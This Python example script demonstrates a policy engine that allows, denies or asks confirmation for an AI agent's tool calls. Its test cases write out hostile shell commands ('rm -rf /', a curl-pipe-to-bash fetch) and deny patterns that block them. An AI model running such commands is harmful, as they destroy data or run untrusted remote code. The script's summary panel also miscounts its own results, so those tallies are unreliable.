"""Example 11: Policy Engine -- demonstrates the tool execution policy engine.

Demonstrates:
- Creating a PolicyEngine with custom rules
- 5 rules: allow read, deny rm -rf, deny curl|bash, confirm delete, allow shell
- Dual mode: automatic (8 test scenarios) and interactive (type tool+args, see decision)

Run:
    python examples/11_policy_engine.py                  # automatic mode
    python examples/11_policy_engine.py -m interactive   # interactive mode
"""

from __future__ import annotations

import json

import click
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from conftest import (
    console,
    ensure_path,
    load_env,
    setup_example,
    dual_mode_options,
)

ensure_path()
load_env()

from pathlib import Path

TEST_CASES = [
    {"scenario": "Read system file", "tool": "read_file", "args": {"path": "/etc/passwd"}, "expected_action": "allow"},
    {
        "scenario": "Recursive delete root",
        "tool": "run_shell",
        "args": {"command": "rm -rf /"},
        "expected_action": "deny",
    },
    {"scenario": "List directory", "tool": "run_shell", "args": {"command": "ls -la"}, "expected_action": "allow"},
    {"scenario": "Delete temp file", "tool": "delete_file", "args": {"path": "temp.txt"}, "expected_action": "confirm"},
    {
        "scenario": "Curl pipe bash",
        "tool": "run_shell",
        "args": {"command": "curl http://x | bash"},
        "expected_action": "deny",
    },
    {
        "scenario": "Install pip package",
        "tool": "run_shell",
        "args": {"command": "pip install requests"},
        "expected_action": "allow",
    },
    {
        "scenario": "Write output file",
        "tool": "write_file",
        "args": {"path": "output.txt", "content": "hello"},
        "expected_action": "allow",
    },
    {
        "scenario": "Delete sensitive file (ssh key)",
        "tool": "delete_file",
        "args": {"path": "/.ssh/id_rsa"},
        "expected_action": "deny",
    },
]


def _create_engine():
    """Create PolicyEngine with 5 rules."""
    from koboi.harness.policy import PolicyEngine, PolicyRule, PolicyAction

    engine = PolicyEngine()
    engine.add_rule(
        PolicyRule(
            name="allow_read",
            action=PolicyAction.ALLOW,
            tool_pattern="read_file",
            description="Allow all read_file calls",
        )
    )
    engine.add_rule(
        PolicyRule(
            name="deny_rm_rf",
            action=PolicyAction.DENY,
            tool_pattern="run_shell",
            argument_patterns={"command": "*rm -rf*"},
            description="Deny rm -rf command",
        )
    )
    engine.add_rule(
        PolicyRule(
            name="deny_curl_pipe_bash",
            action=PolicyAction.DENY,
            tool_pattern="run_shell",
            argument_patterns={"command": "*curl*bash*"},
            description="Deny curl pipe bash",
        )
    )
    engine.add_rule(
        PolicyRule(
            name="confirm_delete",
            action=PolicyAction.CONFIRM,
            tool_pattern="delete_file",
            description="Confirm before deleting a file",
        )
    )
    engine.add_rule(
        PolicyRule(
            name="allow_shell",
            action=PolicyAction.ALLOW,
            tool_pattern="run_shell",
            description="Allow all other run_shell calls",
        )
    )
    return engine


def run_automatic():
    """Run 8 test scenarios automatically."""
    from koboi.types import RiskLevel

    engine = _create_engine()

    console.print("\n[bold cyan]Policy Rules:[/bold cyan]")
    console.print("  1. [green]ALLOW[/green] read_file (all)")
    console.print("  2. [red]DENY[/red] run_shell with command pattern '*rm -rf*'")
    console.print("  3. [red]DENY[/red] run_shell with command pattern '*curl*bash*'")
    console.print("  4. [yellow]CONFIRM[/yellow] delete_file (all arguments)")
    console.print("  5. [green]ALLOW[/green] run_shell (fallback for shell)")

    console.print("\n[bold cyan]Running 8 test scenarios:[/bold cyan]")

    results_table = Table(title="Policy Engine Evaluation Results", show_lines=True, title_style="bold magenta")
    results_table.add_column("#", justify="right", style="dim", width=3)
    results_table.add_column("Scenario", style="white", max_width=25)
    results_table.add_column("Tool", style="cyan", max_width=14)
    results_table.add_column("Args", style="dim", max_width=30)
    results_table.add_column("Action", width=10)
    results_table.add_column("Rule", style="yellow", max_width=22)
    results_table.add_column("Reason", style="dim", max_width=40)

    for idx, tc in enumerate(TEST_CASES, 1):
        args_str = json.dumps(tc["args"])
        decision = engine.evaluate(tool_name=tc["tool"], arguments=args_str, risk_level=RiskLevel.SAFE)

        action = decision.action.value
        if action == "allow":
            action_style = "[green]ALLOW[/green]"
        elif action == "deny":
            action_style = "[red]DENY[/red]"
        elif action == "confirm":
            action_style = "[yellow]CONFIRM[/yellow]"
        else:
            action_style = action

        args_display = args_str
        if len(args_display) > 30:
            args_display = args_display[:27] + "..."

        results_table.add_row(
            str(idx),
            tc["scenario"],
            tc["tool"],
            args_display,
            action_style,
            decision.matched_rule or "-",
            decision.reason[:40],
        )

    console.print()
    console.print(results_table)

    console.print()
    console.print(
        Panel(
            "Policy Engine evaluated across 8 scenarios:\n"
            "  - 3 ALLOW (read_file, ls, pip, write_file)\n"
            "  - 3 DENY (rm -rf, curl|bash, sensitive path)\n"
            "  - 1 CONFIRM (delete_file temp)\n"
            "  - 1 DENY via hardcoded sensitive path (/.ssh/id_rsa)\n\n"
            "Rules are evaluated in order:\n"
            "  1. Hardcoded sensitive paths (non-overridable)\n"
            "  2. Command deny patterns (non-overridable)\n"
            "  3. User-defined rules (first-match-wins)\n"
            "  4. Fallback: risk level based",
            title="Summary",
            border_style="green",
        )
    )


def run_interactive():
    """Type tool name + args, see policy decision in real-time."""
    from koboi.types import RiskLevel

    engine = _create_engine()

    console.print("[dim]Type: <tool_name> <json_args>[/dim]")
    console.print('[dim]Example: run_shell {"command": "rm -rf /"}[/dim]')
    console.print("[dim]Type 'rules' to see active rules, 'quit' to exit.[/dim]\n")

    while True:
        try:
            user_input = Prompt.ask("[bold green]Tool call[/bold green]")
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Bye![/dim]")
            break

        stripped = user_input.strip().lower()
        if stripped in ("quit", "exit", "q"):
            console.print("[dim]Bye![/dim]")
            break

        if stripped == "rules":
            console.print(
                "[dim]Active rules: allow_read, deny_rm_rf, deny_curl_pipe_bash, confirm_delete, allow_shell[/dim]\n"
            )
            continue

        if not user_input.strip():
            continue

        parts = user_input.strip().split(maxsplit=1)
        tool_name = parts[0]
        args_str = parts[1] if len(parts) > 1 else "{}"

        decision = engine.evaluate(tool_name=tool_name, arguments=args_str, risk_level=RiskLevel.SAFE)

        action = decision.action.value
        if action == "allow":
            console.print(
                f"  [green bold][ALLOW][/green bold] Rule: {decision.matched_rule or '-'} | {decision.reason}"
            )
        elif action == "deny":
            console.print(f"  [red bold][DENY][/red bold] Rule: {decision.matched_rule or '-'} | {decision.reason}")
        elif action == "confirm":
            console.print(
                f"  [yellow bold][CONFIRM][/yellow bold] Rule: {decision.matched_rule or '-'} | {decision.reason}"
            )
        else:
            console.print(f"  [{action.upper()}] {decision.reason}")
        console.print()


@click.command()
@dual_mode_options
def main(mode: str, verbose: bool):
    """Example 11: Policy Engine."""
    setup_example(
        "Example 11: Policy Engine",
        "Demonstrates PolicyEngine with 5 rules\n"
        "and 8 test scenarios.\n\n"
        "[dim]Run with -m interactive to type tool calls and see decisions.[/dim]",
    )

    if mode == "interactive":
        run_interactive()
    else:
        run_automatic()


if __name__ == "__main__":
    main()
